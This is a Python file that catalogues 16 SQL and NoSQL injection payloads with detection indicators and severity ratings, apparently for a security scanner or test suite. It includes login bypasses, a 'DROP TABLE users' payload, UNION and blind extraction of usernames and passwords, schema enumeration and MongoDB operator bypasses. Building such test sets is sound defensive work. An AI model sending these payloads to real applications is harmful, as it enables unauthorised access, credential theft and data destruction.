"""SQL injection payload categories - COMPLETE COLLECTION."""

from typing import List, Dict, Any


class SQLInjectionPayloads:
    """Complete collection of SQL injection attack payloads (16 total)."""
    
    @staticmethod
    def get_basic_sql_payloads() -> List[Dict[str, Any]]:
        """Get basic SQL injection payloads."""
        return [
            {
                "payload": "' OR '1'='1",
                "expected_indicators": ["or", "1=1"],
                "severity": "critical",
                "description": "Basic SQL injection bypass"
            },
            {
                "payload": "'; DROP TABLE users; --",
                "expected_indicators": ["drop", "table", "users"],
                "severity": "critical", 
                "description": "SQL injection with table drop"
            },
            {
                "payload": "' UNION SELECT username, password FROM users --",
                "expected_indicators": ["union", "select", "password"],
                "severity": "critical",
                "description": "Union-based data extraction"
            },
        ]
    
    @staticmethod
    def get_blind_sql_payloads() -> List[Dict[str, Any]]:
        """Get blind SQL injection payloads."""
        return [
            {
                "payload": "'; WAITFOR DELAY '00:00:05'; --",
                "expected_indicators": ["waitfor", "delay"],
                "severity": "high",
                "description": "Time-based blind SQL injection"
            },
            {
                "payload": "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "expected_indicators": ["select", "count", "users"],
                "severity": "high",
                "description": "Boolean-based blind injection"
            },
            {
                "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
                "expected_indicators": ["select", "sleep"],
                "severity": "high",
                "description": "MySQL time-based blind injection"
            },
            {
                "payload": "'; SELECT pg_sleep(5); --",
                "expected_indicators": ["pg_sleep"],
                "severity": "high",
                "description": "PostgreSQL time delay"
            },
        ]
    
    @staticmethod 
    def get_database_specific_payloads() -> List[Dict[str, Any]]:
        """Get database-specific SQL injection payloads."""
        return [
            {
                "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
                "expected_indicators": ["convert", "@@version"],
                "severity": "high",
                "description": "MSSQL version extraction"
            },
            {
                "payload": "' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
                "expected_indicators": ["information_schema", "table_name"],
                "severity": "high",
                "description": "Database schema extraction"
            },
            {
                "payload": "admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
                "expected_indicators": ["substring", "password"],
                "severity": "high", 
                "description": "Boolean-based password extraction"
            },
            {
                "payload": "' UNION SELECT NULL,version(),current_database()--",
                "expected_indicators": ["version", "current_database"],
                "severity": "medium",
                "description": "PostgreSQL information disclosure"
            },
            {
                "payload": "' UNION SELECT sql FROM sqlite_master--",
                "expected_indicators": ["sqlite_master", "sql"],
                "severity": "medium",
                "description": "SQLite schema extraction"
            },
        ]
    
    @staticmethod
    def get_nosql_payloads() -> List[Dict[str, Any]]:
        """Get NoSQL injection payloads."""
        return [
            {
                "payload": "'; return db.users.find(); //",
                "expected_indicators": ["db.users.find"],
                "severity": "high",
                "description": "NoSQL injection attempt"
            },
            {
                "payload": "{'$ne': null}",
                "expected_indicators": ["$ne", "null"],
                "severity": "medium",
                "description": "MongoDB not equal bypass"
            },
            {
                "payload": "{'$gt': ''}",
                "expected_indicators": ["$gt"],
                "severity": "medium",
                "description": "MongoDB greater than bypass"
            },
            {
                "payload": "{'$regex': '.*'}",
                "expected_indicators": ["$regex"],
                "severity": "medium",
                "description": "MongoDB regex injection"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all 16 SQL injection payloads."""
        payloads = []
        payloads.extend(SQLInjectionPayloads.get_basic_sql_payloads())
        payloads.extend(SQLInjectionPayloads.get_blind_sql_payloads())
        payloads.extend(SQLInjectionPayloads.get_database_specific_payloads())
        payloads.extend(SQLInjectionPayloads.get_nosql_payloads())
        return payloads